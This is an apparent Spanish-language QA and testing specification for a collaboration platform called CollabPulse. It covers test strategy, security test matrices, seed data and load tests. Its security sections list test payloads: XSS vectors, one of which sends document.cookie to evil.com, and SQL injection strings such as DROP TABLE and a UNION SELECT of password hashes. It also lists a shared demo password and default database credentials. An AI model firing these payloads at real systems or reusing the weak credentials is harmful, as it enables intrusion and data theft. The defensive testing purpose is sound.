# PARTE 6 — QA, TESTING, SEED DATA, VALIDACIÓN Y PLAN MAESTRO DE IMPLEMENTACIÓN
**CollabPulse Enterprise Platform — Testing, QA & Master Delivery Specification**
**Versión:** 1.0.0-PROD | **Estado:** APROBADO & VIGENTE

---

## 1. OBJETIVO
El objetivo central de esta especificación es definir, estructurar y ejecutar el marco integral de aseguramiento de calidad (QA), testing automatizado multi-nivel (Unitario, Integración, End-to-End, Carga, Concurrencia, Resiliencia y Seguridad Zero-Trust), aprovisionamiento de datos semilla (*Seed Data* y generador sintético a escala), y el **Plan Maestro de Implementación** estructurado en 16 fases secuenciales e inquebrantables para la plataforma **CollabPulse**.

Ninguna funcionalidad se considerará lista para producción (*Production-Ready*) sin cumplir la totalidad de las compuertas de calidad (*Quality Gates*), umbrales de cobertura estricta y validación de aislamiento multi-tenant aquí establecidos.

---

## 2. ESTRATEGIA GENERAL DE TESTING
La estrategia de pruebas adopta el modelo de **Pirámide de Testing Automatizado**, reforzado con análisis estático continuo y pruebas de penetración automatizadas en el pipeline de CI/CD:

```
                  ▲
                 / \
                /E2E\             (Playwright: Flujos Críticos de Usuario)
               /-----\
              / Int.  \           (API + PostgreSQL + Redis + Auth + SignalR)
             /---------\
            /  Unitario \         (xUnit / Jest: Dominio, Reglas de Negocio, CQRS)
           /-------------\
          / Estático/Sec. \       (SonarQube, Trivy, Roslyn Analyzers, ESLint)
         /─────────────────\
```

- **Pruebas Unitarias (Base):** Rápidas, aisladas, sin I/O real. Validan invariantes de dominio, comandos CQRS, validadores FluentValidation y utilidades puras.
- **Pruebas de Integración (Cuerpo Medio):** Ejecutadas contra bases de datos PostgreSQL y Redis efímeros (Testcontainers o base de prueba aislada). Validan transacciones, políticas RLS multi-tenant, persistencia EF Core, interceptores y endpoints HTTP.
- **Pruebas de Contrato y Seguridad:** Verificación de esquemas OpenAPI, aislamiento multi-tenant entre Workspaces, protección IDOR y rate limiting.
- **Pruebas E2E (Cúspide):** Automatización con Playwright sobre navegadores Chromium, Firefox y WebKit emulando interacciones de usuarios reales y señalización en tiempo real vía WebSocket.
- **Pruebas de Rendimiento y Caos:** Scripts k6 para pruebas de carga sostenida (1,000 VUs) y stress en SignalR, además de inyección de fallos con Chaos Toolkit.

---

## 3. UNIT TESTS (BACKEND & FRONTEND)
- **Backend (.NET 8):**
  - Framework: `xUnit` 2.9+, `FluentAssertions` 6.12+, `Moq` 4.20+.
  - Enfoque: Red-Green-Refactor. Aislamiento estricto de I/O mediante inyección de dependencias (`Mock<IApplicationDbContext>`, `Mock<ICurrentUserService>`, `Mock<IDateTime>`).
  - Pruebas de Domain Entities: Validan métodos de negocio (ej. `Workspace.AddMember()`, `Message.AddReaction()`, `Task.ChangeStatus()`) garantizando el disparo de eventos de dominio (`DomainEvent`).
  - Pruebas de CQRS Handlers: Cobertura completa de `IRequestHandler<TCommand, TResponse>` y pipelines de validación.
- **Frontend (Angular / TypeScript):**
  - Framework: `Karma`/`Jasmine` o `Jest` / `@testing-library/angular`.
  - Enfoque: Pruebas unitarias de servicios (`AuthService`, `SignalRService`, `WorkspaceStateService`) y Store reactivo.
  - Componentes: Pruebas de renderizado con `TestBed`, aislamiento de llamadas HTTP con `HttpClientTestingModule`.

---

## 4. COBERTURA DE CÓDIGO (CODE COVERAGE GATES)
Los umbrales mínimos requeridos para superar la compuerta de CI son obligatorios y bloqueantes:

| Capa del Sistema | Métrica Mínima Requerida | Métrica Objetivo |
| :--- | :--- | :--- |
| **Domain Logic & Entities** | **85% Líneas / 85% Ramas** | 95% |
| **Application Handlers (CQRS)** | **80% Líneas / 80% Ramas** | 90% |
| **Security, Auth & Multi-tenant Filters** | **95% Líneas / 95% Ramas** | 100% |
| **Infrastructure Repositories & DbContext** | **75% Líneas / 70% Ramas** | 85% |
| **Frontend Core Services & State** | **80% Líneas / 80% Ramas** | 90% |
| **Frontend UI Components** | **70% Líneas / 65% Ramas** | 80% |

Cualquier Pull Request que degrade la cobertura general en más de un 0.5% o incumpla los umbrales anteriores será rechazado automáticamente por el workflow de GitHub Actions.

---

## 5. INTEGRATION TESTS (API + DB + REDIS + STORAGE + AUTH)
Las pruebas de integración validan el comportamiento holístico del sistema utilizando una instancia dedicada de `CustomWebApplicationFactory<Program>`:
1. **Petición HTTP:** Se emite `POST /api/v1/workspaces/{id}/channels/{channelId}/messages` con Bearer Token JWT.
2. **Autenticación y Contexto:** Middleware JWT valida claims y establece `ICurrentUserService` (`UserId`, `TenantId`, `WorkspaceId`).
3. **Validación:** `ValidationBehavior` ejecuta `SendMessageCommandValidator`.
4. **Persistencia:** EF Core escribe en PostgreSQL dentro de una transacción activa, verificando constraints de llave foránea y RLS.
5. **Caché e Invalidación:** Redis almacena el mensaje reciente y actualiza los contadores de lectura no leída.
6. **Tiempo Real:** Se simula o intercepta la invocación de `IHubContext<ChatHub>` para validar la difusión del evento `ReceiveMessage` al grupo correspondiente.

---

## 6. TEST DATABASE (APROVISIONAMIENTO Y AISLAMIENTO)
- **Modo CI/CD:** Contenedor efímero de PostgreSQL 18.4 provisionado con Testcontainers (`Testcontainers.PostgreSql`) y Redis (`Testcontainers.Redis`).
- **Modo Local:** Base de datos dedicada `collabpulse_test` en el cluster de Docker Compose local.
- **Ciclo de Vida:**
  1. Aprovisionamiento inicial del contenedor/base.
  2. Ejecución automatizada de migraciones EF Core (`context.Database.MigrateAsync()`).
  3. Ejecución del suite de pruebas.
  4. Destrucción o purgado completo al finalizar el test run.

---

## 7. DATABASE TEST ISOLATION
Para asegurar que las pruebas sean determinísticas, repetibles y ejecutables en paralelo sin interferencias de estado:
- Cada clase o método de prueba ejecuta dentro de un `TransactionScope` o transacción explícita de EF Core que realiza `Rollback` inmediato al completar:
  ```csharp
  await using var transaction = await _context.Database.BeginTransactionAsync();
  // Ejecución de la prueba
  await _context.Database.RollbackTransactionAsync();
  ```
- Alternativamente, para pruebas que requieren commits intermedios (ej. verificación de bloqueos de concurrencia), se ejecuta una limpieza rápida mediante `Respawn` o script de truncado rápido sobre tablas transaccionales.

---

## 8. API TESTING MATRIX
Toda ruta de la API RESTful cuenta con pruebas automatizadas para los siguientes escenarios HTTP:
- **200/201 (Happy Path):** Payload válido, headers requeridos, respuesta formateada según contrato JSON:API o RFC 7807.
- **400 Bad Request:** Fallo de validación FluentValidation con listado detallado de campos y errores.
- **401 Unauthorized:** Ausencia de token JWT, token expirado, firma inválida o issuer incorrecto.
- **403 Forbidden:** Usuario autenticado pero sin rol o permisos suficientes dentro del Workspace.
- **404 Not Found:** Recurso inexistente o recurso perteneciente a otro Tenant (aislamiento de seguridad).
- **409 Conflict:** Violación de unicidad (ej. canal con nombre duplicado en el mismo workspace).
- **422 Unprocessable Entity:** Payload con sintaxis correcta pero semántica de negocio inviable.
- **429 Too Many Requests:** Exceso de cuota por Rate Limiting (Redis token bucket).
- **Paginación, Filtrado y Ordenamiento:** Verificación de cursor pagination (`cursor`, `limit`), filtros estructurados y orden ascendente/descendente.

---

## 9. AUTHENTICATION TEST MATRIX
| Caso de Prueba | Entrada | Comportamiento Esperado |
| :--- | :--- | :--- |
| **Login Exitoso** | Email verificado + Password correcto | 200 OK + JWT Access Token (15m) + Refresh Token (7d) en cookie HttpOnly |
| **Password Erróneo** | Password incorrecto | 401 Unauthorized + Incremento de contador de intentos fallidos |
| **Account Lockout** | 5 intentos fallidos consecutivos | 423 Locked + Cuenta bloqueada por 15 minutos + Notificación por email |
| **Email No Verificado** | Cuenta recién creada sin confirmar | 403 Forbidden ("Email verification required") |
| **Refresh Token Válido** | Token activo y no revocado | 200 OK + Nuevo Access Token + Rotación de Refresh Token |
| **Refresh Token Reuso (Ataque)** | Token ya rotado presentado nuevamente | 401 Unauthorized + Revocación automática de toda la familia de tokens de la sesión |
| **Cierre de Sesión** | `POST /api/v1/auth/logout` | 200 OK + Inclusión del Refresh Token en blacklist de Redis |
| **Cerrar Todas las Sesiones** | `POST /api/v1/auth/logout-all` | 200 OK + Revocación de todas las sesiones activas del usuario en PostgreSQL y Redis |

---

## 10. AUTHORIZATION TESTING (RBAC)
Matriz de verificación de permisos por rol en el Workspace:
- **Workspace Owner:** Acceso total a configuraciones, facturación, transferencias de propiedad, eliminación de canales y borrado de mensajes de terceros.
- **Workspace Admin:** Gestión de usuarios, asignación de roles, gestión de canales públicos y privados, pero sin acceso a facturación crítica o eliminación del workspace.
- **Member:** Creación de canales públicos, envío de mensajes, hilos, tareas, calendario, edición de sus propios recursos.
- **Guest (Invitado mono-canal):** Restringido exclusivamente al canal asignado. Intentos de listar otros canales o acceder a direct messages externos devuelven **403 Forbidden**.

---

## 11. MULTI-TENANT SECURITY TESTS
Pruebas de aislamiento estricto para evitar fuga de datos entre organizaciones:
- **Tenant A vs Tenant B:**
  - Se aprovisiona el Tenant A (`Acme Corp`, ID: `1111...`) y el Tenant B (`Globex`, ID: `2222...`).
  - Usuario de Tenant A intenta realizar `GET /api/v1/workspaces/{tenantB_Id}/channels`.
  - **Resultado exigido:** El sistema responde **404 Not Found** (para no revelar existencia) o **403 Forbidden**.
  - Verificación directa en base de datos: Ninguna consulta ejecutada bajo el DbContext de Tenant A puede retornar registros cuyo `tenant_id` sea distinto a Tenant A.

---

## 12. IDOR (INSECURE DIRECT OBJECT REFERENCE) TESTING
- Modificación deliberada de identificadores UUID en parámetros de URL y cuerpos JSON:
  - Intento de editar mensaje de otro usuario: `PUT /api/v1/messages/{other_user_message_id}` -> Devuelve **403 Forbidden**.
  - Intento de descargar archivo privado de otro canal al que no se pertenece: `GET /api/v1/files/{private_file_id}` -> Devuelve **404 Not Found**.
  - Intento de completar tarea asignada a otro workspace: `POST /api/v1/tasks/{other_tenant_task_id}/complete` -> Devuelve **404 Not Found**.

---

## 13. MESSAGE TESTING
- Envío de mensajes de texto en canales públicos y privados.
- Formato rico (Markdown, menciones `@usuario`, `@channel`, `@here`).
- Edición de mensajes: Se almacena historial de auditoría y se marca `is_edited = true` con `edited_at`.
- Eliminación de mensajes: Borrado lógico (`soft delete`), marcando contenido como "[Mensaje eliminado]" conservando la integridad de respuestas en hilos.
- Reacciones: Agregar/quitar emojis idempotentemente; límite máximo de 20 reacciones por usuario en un mismo mensaje.
- Fijado de mensajes (*Pinning*): Límite de 50 mensajes fijados por canal.

---

## 14. MESSAGE PERMISSION TESTING
- Validación de que usuarios suspendidos o expulsados no pueden emitir mensajes.
- Validación de que canales de solo lectura (*Announcements*) únicamente permiten escribir a Administradores y Propietarios.
- Verificación de que miembros regulares no pueden editar ni eliminar mensajes emitidos por otros participantes.

---

## 15. THREAD TESTING
- Inicio de un hilo a partir de un mensaje padre (`parent_message_id`).
- Contador de respuestas (`reply_count`) actualizado de forma atómica.
- Lista de participantes del hilo (`thread_participants`) actualizada automáticamente.
- Consulta de mensajes del hilo con orden cronológico ascendente y paginación por cursor.

---

## 16. REALTIME TESTING (SIGNALR)
- Conexión al hub `/hubs/chat` validando el token JWT en el query string o header de autorización.
- Suscripción automática a los grupos correspondientes según los canales a los que pertenece el usuario.
- Notificación en tiempo real de eventos: `MessageCreated`, `MessageUpdated`, `MessageDeleted`, `ReactionAdded`, `ReactionRemoved`.
- Verificación de que usuarios fuera del canal no reciben transmisiones de eventos privados.

---

## 17. SIGNALR RECONNECT & BACKPRESSURE TEST
- Simulación de desconexión abrupta del cliente y reconexión dentro del margen de gracia (30 segundos).
- El cliente envía el último `message_id` o timestamp recibido para solicitar re-sincronización de eventos perdidos (*Catch-up sync*).
- Manejo de backpressure: clientes lentos no saturan la memoria del servidor; descarte controlado tras rebasar búfer de salida configurado.

---

## 18. TYPING INDICATOR TEST
- Emisión del evento `TypingStarted` por parte de un usuario.
- Difusión a los demás miembros del canal con un Time-To-Live (TTL) de 4 segundos en Redis.
- Cancelación explícita mediante evento `TypingStopped` o expiración automática del temporizador para evitar estados colgados.

---

## 19. PRESENCE & HEARTBEAT TEST
- Registro del estado de presencia en Redis (`Online`, `Away`, `Busy`, `Offline`).
- Envío de heartbeat cada 30 segundos desde el cliente.
- Si no se recibe heartbeat en 60 segundos, un worker en segundo plano marca al usuario automáticamente como `Offline` y difunde el cambio a su workspace.

---

## 20. FILE TESTING
- Subida de archivos multipart/form-data con verificación de hash SHA-256 para desduplicación.
- Soporte para subida directa mediante URLs prefirmadas de Azure Blob Storage o S3.
- Generación asíncrona de miniaturas (*thumbnails*) para imágenes (`image/png`, `image/jpeg`, `image/webp`).
- Metadatos persistidos: nombre original, tipo MIME, tamaño en bytes, hash y ruta segura en storage.

---

## 21. FILE SECURITY TESTING
- Validación de extensiones permitidas y denegadas (bloqueo estricto de `.exe`, `.dll`, `.bat`, `.sh`, `.vbs`, `.ps1`).
- Validación de Magic Numbers (cabeceras binarias reales) para prevenir spoofing de extensiones (ej. un ejecutable renombrado a `.pdf`).
- Escaneo antivirus/antimalware simulado o integrado (bloqueo y cuarentena ante archivos sospechosos).
- URLs de descarga con expiración corta (máximo 15 minutos) y cabecera `Content-Disposition: attachment; filename="..."` para mitigar ataques XSS vía SVG o HTML.

---

## 22. FILE SIZE LIMITS
- Archivo individual estándar: límite estricto de 50 MB por archivo.
- Archivos de video/grabación de reuniones: límite ampliado a 500 MB (con chunked upload).
- Validación en API Gateway y Middleware: Peticiones que superen el límite se rechazan de inmediato con código **413 Payload Too Large** antes de procesar el stream en memoria.
- Validación de cuota por Workspace: Bloqueo de subidas cuando el storage acumulado alcanza el plan contratado.

---

## 23. SEARCH TESTING
- Búsqueda de texto completo (*Full-Text Search*) sobre mensajes y archivos utilizando `tsvector` y `tsquery` en PostgreSQL (o Elasticsearch/OpenSearch).
- Soporte de operadores booleanos (`AND`, `OR`, `NOT`) y búsquedas por frase exacta (`"frase"`).
- Filtros combinados: por canal (`in:#general`), por usuario (`from:@alice`), por fecha (`before:2026-01-01`), por tipo (`has:attachment`).
- Pruebas de relevancia y ordenamiento temporal.

---

## 24. SEARCH SECURITY
- Los resultados de búsqueda están estrictamente limitados al tenant y a los canales a los que el usuario tiene acceso legítimo.
- Un usuario no puede indexar ni recuperar mensajes de canales privados a los que no ha sido invitado, incluso si coinciden con los términos de búsqueda.
- Sanitización de caracteres de escape para prevenir inyecciones sintácticas en el motor de búsqueda.

---

## 25. TASK TESTING
- Ciclo de vida completo: `To Do` -> `In Progress` -> `Under Review` -> `Completed` -> `Archived`.
- Asignación de tareas a uno o múltiples miembros del workspace.
- Fechas de vencimiento (*Due Date*) y recordatorios automatizados.
- Pruebas de etiquetas, comentarios y adjuntos vinculados a la tarea.

---

## 26. CALENDAR TESTING
- Creación de eventos de calendario con soporte de recurrencia (reglas iCalendar RRULE: diaria, semanal, mensual).
- Detección de conflictos de horario para salas de reunión y participantes obligatorios.
- Sincronización de zonas horarias: almacenamiento unificado en UTC con renderizado adaptado al huso horario del usuario.
- Aceptación, rechazo y tentativa de invitaciones.

---

## 27. MEETING TESTING
- Generación de salas de videollamada únicas con tokens de acceso JWT cifrados.
- Validación de control de anfitrión (*Host controls*): silenciar participantes, expulsar usuarios, bloquear sala.
- Pruebas de señalización WebRTC (oferta/respuesta SDP y candidatos ICE) a través de SignalR.
- Registro de duración y métricas de calidad de la reunión.

---

## 28. NOTIFICATION TESTING
- Enrutamiento multi-canal de notificaciones: In-App, Push móvil y Correo electrónico.
- Agrupamiento inteligente (*Batching/Debouncing*): 5 menciones consecutivas en 1 minuto generan una sola notificación consolidada.
- Respeto estricto a las preferencias de usuario (modo "No Molestar" / Do Not Disturb y horarios laborales).
- Marcado de notificaciones como leídas de forma masiva o individual.

---

## 29. EMAIL TESTING (MOCK EMAIL PROVIDER)
- Integración en pruebas mediante `Mock<IEmailService>` y servidor SMTP de prueba (MailHog o Papercut en Docker).
- Verificación del renderizado de plantillas HTML responsivas (verificación de cuenta, restablecimiento de contraseña, resumen de actividad).
- Verificación de enlaces con tokens criptográficos de un solo uso (*One-Time Tokens* con firma HMAC-SHA256).

---

## 30. BACKGROUND JOB TESTING (HANGFIRE / QUARTZ)
- Encolamiento y ejecución de trabajos en segundo plano (procesamiento de imágenes, envíos de emails masivos, reportes diarios).
- Pruebas de políticas de reintento exponencial (*Exponential Backoff*) ante fallos transitorios.
- Mecanismo de cola de mensajes muertos (*Dead Letter Queue*) tras 5 reintentos fallidos con emisión de alertas a Datadog/Azure Monitor.
- Aislamiento de ejecución: trabajos fallidos no bloquean la cola de procesamiento.

---

## 31. IDEMPOTENCY TEST
- Implementación de cabecera `Idempotency-Key` (UUIDv4) en operaciones críticas (pagos, creación de workspaces, envíos de mensajes).
- Re-envío de la misma petición con idéntica clave de idempotencia: el servidor retorna la respuesta almacenada en Redis sin re-ejecutar efectos secundarios en base de datos.
- Pruebas de colisión con peticiones concurrentes usando la misma clave: la segunda petición espera o recibe código **409 Conflict**.

---

## 32. CONCURRENCY & OPTIMISTIC LOCKING TEST
- Validación de campos de control de concurrencia (`xmin` en PostgreSQL o `RowVersion` en EF Core).
- Simulación de dos usuarios editando simultáneamente el mismo documento, tarea o configuración de workspace.
- El primer commit tiene éxito; el segundo intento lanza `DbUpdateConcurrencyException` y responde con código **409 Conflict** solicitando re-sincronización.

---

## 33. RATE LIMIT TESTING (429)
- Configuración de límites mediante algoritmo Token Bucket en Redis:
  - Rutas públicas de autenticación (`/api/v1/auth/*`): 10 peticiones por minuto por IP.
  - Rutas estándar de API autenticadas: 300 peticiones por minuto por usuario.
  - Subida de archivos: 20 peticiones por minuto.
- Test automatizado: emisión de ráfaga de 350 peticiones concurrentes.
- Validación de que a partir de la petición 301 se recibe **429 Too Many Requests** con cabeceras estándar `Retry-After`, `X-RateLimit-Limit` y `X-RateLimit-Remaining`.

---

## 34. SECURITY TESTING (OWASP TOP 10)
Pipeline automatizado de pruebas de seguridad:
- Escaneo de dependencias vulnerables con `dotnet list package --vulnerable` y `npm audit`.
- Análisis estático SAST con SonarQube y Roslyn Security Analyzers.
- Escaneo DAST dinámico de contenedores e infraestructura con OWASP ZAP y Trivy.
- Verificación de cabeceras HTTP de seguridad: `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Content-Security-Policy`.

---

## 35. XSS (CROSS-SITE SCRIPTING) TEST
- Inyección de vectores maliciosos en campos de texto, mensajes y nombres:
  - `<script>alert('xss')</script>`
  - `<img src=x onerror=alert(1)>`
  - `javascript:void(fetch('http://evil.com?c='+document.cookie))`
- Verificación en backend: Sanitización y codificación contextual con HTML Sanitizer.
- Verificación en frontend: Escapado automático de templates Angular (`DomSanitizer`), sin uso de `innerHTML` desprotegido.

---

## 36. SQL INJECTION TEST
- Inyección de cargas de prueba en filtros de consulta, parámetros de ruta y ordenamiento:
  - `' OR '1'='1`
  - `'; DROP TABLE users; --`
  - `1 UNION SELECT username, password_hash FROM users`
- Validación de que todo acceso a datos se realiza estrictamente a través de consultas parametrizadas EF Core o Dapper con argumentos tipados. Ninguna interpolación de strings directa en SQL está permitida.

---

## 37. PASSWORD SECURITY TESTING
- Validación de complejidad: mínimo 12 caracteres, al menos una mayúscula, una minúscula, un número y un carácter especial.
- Validación contra diccionarios de contraseñas vulnerables y listas de contraseñas filtradas (HaveIBeenPwned API o diccionario local top 100,000).
- Verificación de algoritmo de hash: **Argon2id** (o BCrypt con factor de costo 12+) con sal criptográfica única por usuario.

---

## 38. SESSION TESTING
- Expiración de Access Token fijada en 15 minutos.
- Invocación de revocación de sesión al cambiar contraseña o al detectar anomalías de geolocalización o cambio drástico de User-Agent.
- Detección de sesiones huérfanas mediante limpieza programada cada 24 horas.
- Máximo 5 sesiones activas simultáneas por usuario (política configurable por el administrador del workspace).

---

## 39. FRONTEND E2E TESTING (PLAYWRIGHT)
- Suite automatizado de pruebas de extremo a extremo implementado con **Playwright** en TypeScript.
- Ejecución sin cabeza (*Headless*) en CI y con interfaz interactiva (*UI Mode*) para depuración local.
- Grabación de trazas completas (*Playwright Traces*), capturas de pantalla y videos únicamente en fallos.
- Selectores basados en accesibilidad y roles semánticos (`getByRole`, `getByTestId`), evitando selectores CSS frágiles.

---

## 40. E2E — AUTHENTICATION FLOW
- Registro de nuevo usuario con validación de formularios en tiempo real.
- Simulación de confirmación de email mediante mock de token.
- Inicio de sesión, redirección al dashboard principal y verificación de cookies seguras.
- Flujo de olvido y recuperación de contraseña.

---

## 41. E2E — WORKSPACE ONBOARDING & MANAGEMENT
- Creación de nuevo workspace: asignación de nombre, slug único y subida de avatar.
- Configuración de dominios de correo permitidos (ej. `@acme.com`).
- Invitación de nuevos miembros por correo electrónico y generación de enlaces de invitación con caducidad.

---

## 42. E2E — REALTIME CHAT & MESSAGING
- Dos instancias de navegador abiertas en paralelo (Usuario A y Usuario B en el mismo canal).
- Usuario A escribe un mensaje -> Usuario B visualiza el indicador de tipeo en tiempo real.
- Usuario A presiona Enter -> Usuario B recibe el mensaje instantáneamente sin recargar la página.
- Usuario B reacciona con un emoji -> Usuario A ve el contador de reacciones incrementarse en vivo.

---

## 43. E2E — DIRECT MESSAGING & PRESENCE
- Inicio de una conversación directa privada 1 a 1 entre dos usuarios.
- Verificación de que otros usuarios no pueden acceder al identificador de la conversación.
- Cambio de estado de presencia de `Online` a `Away` reflejado de inmediato en el avatar del interlocutor.

---

## 44. E2E — TASK MANAGEMENT (KANBAN)
- Creación de tarea en columna "To Do" con título, descripción y fecha límite.
- Operación de arrastrar y soltar (*Drag and Drop*) de la tarea hacia la columna "In Progress".
- Verificación de persistencia: recarga de página y confirmación del nuevo estado en base de datos.

---

## 45. E2E — CALENDAR & SCHEDULING
- Apertura del calendario mensual y semanal.
- Creación de un nuevo evento con participantes seleccionados.
- Verificación del renderizado del bloque temporal y recepción de la notificación correspondiente en la cuenta de los invitados.

---

## 46. E2E — ADMIN DASHBOARD & AUDIT LOGS
- Inicio de sesión con cuenta de Workspace Owner.
- Navegación al panel de administración: listado de miembros, cambio de roles (de Member a Admin).
- Consulta de los registros de auditoría (*Audit Logs*) verificando que la acción anterior quedó registrada con timestamp, IP y actor.

---

## 47. SEED DATA STRATEGY (DEV, TEST, DEMO)
- Separación rigurosa de entornos: los datos semilla **JAMÁS** se cargan automáticamente en entornos de Producción.
- Los scripts y generadores están condicionados a la variable `ASPNETCORE_ENVIRONMENT == "Development"` o al flag explícito `--seed-demo`.
- Generación de datos relacionalmente coherentes, con identificadores determinísticos (UUIDs predecibles para tests repetibles).

---

## 48. SEED STRUCTURE
Los datos semilla abarcan todo el grafo de entidades de CollabPulse:
- **Tenants & Subscriptions:** Planes Free, Pro y Enterprise con suscripciones activas.
- **Roles & Permissions:** Matriz completa de 45 permisos del sistema.
- **Users & Profiles:** Cuentas predefinidas con contraseñas conocidas para testing.
- **Workspaces & Memberships:** Espacios corporativos con miembros asignados y avatares realistas.
- **Channels & Conversations:** Canales generales, técnicos, temáticos y chats directos.
- **Messages & Reactions:** Mensajes con formateo Markdown, hilos de conversación y reacciones.
- **Tasks & Boards:** Tableros Kanban poblados con tareas en distintos estados y prioridades.
- **Calendar Events:** Reuniones y eventos programados para la semana actual y próxima.
- **Notifications:** Notificaciones de sistema, menciones y alertas de tareas.

---

## 49. DEMO USERS (Cuentas Estándar de Prueba)
Todas las cuentas de prueba utilizan la contraseña común para desarrollo: `Password123!` (hasheada con Argon2id):
- **Owner:** `alex.owner@acme.com` (Alex Morgan - CEO & Workspace Owner)
- **Admin:** `sarah.admin@acme.com` (Sarah Connor - VP Engineering & Workspace Admin)
- **Member:** `david.dev@acme.com` (David Miller - Senior Software Engineer)
- **Member:** `elena.design@acme.com` (Elena Rostova - Lead Product Designer)
- **Guest:** `carlos.guest@external.com` (Carlos Vega - Contractor / Single-Channel Guest)

---

## 50. DEMO WORKSPACE (Acme Corporation)
- **Nombre:** Acme Corporation | **Slug:** `acme-corp`
- **Canales Públicos:**
  - `#general`: Canal general de la compañía.
  - `#engineering`: Debates técnicos, deploys y arquitectura.
  - `#marketing`: Campañas, lanzamientos y métricas.
  - `#random`: Conversación informal, memes y café virtual.
  - `#announcements`: Canal de solo lectura para anuncios corporativos oficiales.
- **Canales Privados:**
  - `🔒 management`: Acceso exclusivo para Alex y Sarah.

---

## 51. DEMO MESSAGES & THREADS
- Conversaciones contextuales y creíbles simulando un día de trabajo real en una empresa de software:
  - Lanzamiento de la versión v2.4 en `#engineering`.
  - Hilo con 8 respuestas debatiendo la adopción de OpenTelemetry y optimización de consultas SQL.
  - Mensajes con bloques de código TypeScript y C# sintácticamente coloreados.
  - Mensajes fijados con directrices de contribución y enlaces a documentación.

---

## 52. LARGE DATA SEED
Para pruebas de rendimiento local y benchmarking:
- Generación volumétrica controlada mediante script SQL optimizado con `generate_series()`:
  - 10 Workspaces.
  - 500 Usuarios activos.
  - 50 Canales.
  - 50,000 Mensajes distribuidos uniformemente.
  - 1,000 Tareas Kanban y 500 Eventos de calendario.
- Tiempos de inserción optimizados mediante inserciones por lotes (*Batch Inserts*) y deshabilitación temporal de índices durante la carga masiva.

---

## 53. DATA GENERATOR CLI TOOL (`DataGenerator`)
Herramienta de línea de comandos en .NET 8 (`CollabPulse.DataGenerator`) que permite aprovisionar volúmenes arbitrarios mediante parámetros CLI:
```bash
dotnet run --project backend/src/DataGenerator -- \
  --workspaces 5 \
  --users 200 \
  --channels 50 \
  --messages 20000 \
  --files 500 \
  --tasks 1000 \
  --connection "Host=localhost;Database=collabpulse;Username=postgres;Password=postgres"
```
Implementa generadores sintéticos basados en `Bogus` para producir nombres, correos, contenidos de chat y fechas coherentes con la distribución real del negocio.

---

## 54. PERFORMANCE TESTING (k6 SUITE)
- Scripts de prueba de rendimiento estandarizados con **k6** para ejecución local y en pipelines de validación previa a despliegue.
- Medición sistemática de:
  - Throughput (RPS - Requests Per Second).
  - Tiempos de respuesta: Percentil 50 (P50), Percentil 95 (P95), Percentil 99 (P99).
  - Tasa de error (HTTP 5xx y timeouts).

---

## 55. LOAD TEST — 1,000 CONCURRENT USERS
- **Escenario:** 1,000 Virtual Users (VUs) concurrentes navegando, enviando mensajes y consultando canales durante 10 minutos (con 2 minutos de rampa ascendente y 1 minuto de enfriamiento).
- **Service Level Objectives (SLOs) Obligatorios:**
  - **P50:** < 50 ms.
  - **P95:** < 200 ms.
  - **P99:** < 500 ms.
  - **Tasa de Errores (Error Rate):** < 0.1%.
  - **Disponibilidad:** 99.99%.

---

## 56. REALTIME LOAD TEST (SIGNALR AT SCALE)
- 1,000 conexiones WebSocket simultáneas conectadas a `ChatHub`.
- Escenarios de ráfaga:
  - 10 mensajes/segundo difundidos a canales de 100 usuarios.
  - 100 mensajes/segundo de ráfaga distribuida.
  - Medición de latencia de entrega extremo a extremo (desde `POST /messages` hasta recepción en cliente SignalR): **SLO < 100 ms**.
  - Monitoreo del uso de memoria en Redis Backplane (sin fugas de sockets ni reconexiones en bucle).

---

## 57. DATABASE PERFORMANCE & SLOW QUERIES
- Registro de consultas que superen los **100 ms** mediante el parámetro `log_min_duration_statement = 100` en PostgreSQL.
- Inyección de `Correlation-ID` y `TraceId` en comentarios SQL mediante EF Core Tagging:
  ```csharp
  query.TagWith($"TraceId:{Activity.Current?.TraceId}").ToListAsync();
  ```
- Alertas automáticas en Azure Monitor cuando el número de consultas lentas excede el 1% del total por minuto.

---

## 58. INDEX VALIDATION & EXPLAIN ANALYZE
- Verificación periódica de índices en PostgreSQL mediante `pg_stat_user_indexes`.
- Detección de índices no utilizados (*Unused Indexes*) para su remoción.
- Validación de que todas las consultas de mensajes en canales ejecutan `Index Scan` sobre `idx_messages_channel_created` y no `Seq Scan` (escaneo secuencial de tabla completa).

---

## 59. PAGINATION TEST (CURSOR-BASED EFFICIENCY)
- Las listas de mensajes y auditoría utilizan paginación basada en cursor (`created_at`, `id`) y **NUNCA** paginación por desplazamiento (`OFFSET / LIMIT`).
- Pruebas comparativas de rendimiento:
  - Lectura de página 1 vs página 10,000: tiempo de respuesta plano (< 15 ms) sin degradación computacional.

---

## 60. LARGE CHANNEL TEST (100,000 MESSAGES)
- Canal de prueba poblado con 100,000 mensajes.
- Validación de que la carga inicial de los últimos 50 mensajes toma **menos de 30 ms**.
- Desplazamiento hacia atrás (*Infinite Scroll*) fluido, consumiendo lotes paginados con indexación optimizada.

---

## 61. LARGE WORKSPACE TEST (10,000 USERS & 1,000 CHANNELS)
- Prueba de carga y rendimiento sobre un workspace masivo:
  - Listado de canales para un usuario: < 40 ms.
  - Notificaciones de presencia masivas optimizadas mediante Redis Pub/Sub y agrupamiento en batches para no saturar el canal de red del cliente.

---

## 62. BROWSER COMPATIBILITY QA
- Matriz de pruebas automatizadas en Playwright cubriendo:
  - Google Chrome / Chromium (últimas 2 versiones).
  - Mozilla Firefox (últimas 2 versiones).
  - Apple Safari / WebKit (últimas 2 versiones).
  - Microsoft Edge (últimas 2 versiones).
- Validación de soporte completo de WebSockets, Service Workers, WebRTC y LocalStorage en todos los motores de renderizado.

---

## 63. RESPONSIVE DESIGN QA (320px A 1920px)
- Pruebas de maquetación y adaptabilidad visual en múltiples viewports:
  - Móvil Pequeño: 320px x 568px (iPhone SE).
  - Móvil Estándar: 390px x 844px (iPhone 14).
  - Tablet: 768px x 1024px (iPad Mini).
  - Laptop / Desktop: 1280px x 800px y 1920px x 1080px.
- En pantallas móviles: colapso automático del sidebar en menú hamburguesa off-canvas, áreas de toque (*touch targets*) de al menos 44px x 44px.

---

## 64. ACCESSIBILITY QA (WCAG 2.1 NIVEL AA)
- Verificación automatizada con `axe-core` integrado en pruebas de Playwright:
  - Cero violaciones críticas o serias de accesibilidad.
  - Contraste de color mínimo de **4.5:1** para texto normal y **3:1** para texto grande o componentes interactivos.
  - Navegación completa mediante teclado (uso estricto de foco visible, `tabindex` coherente y teclas `Escape` / `Enter` para modales).
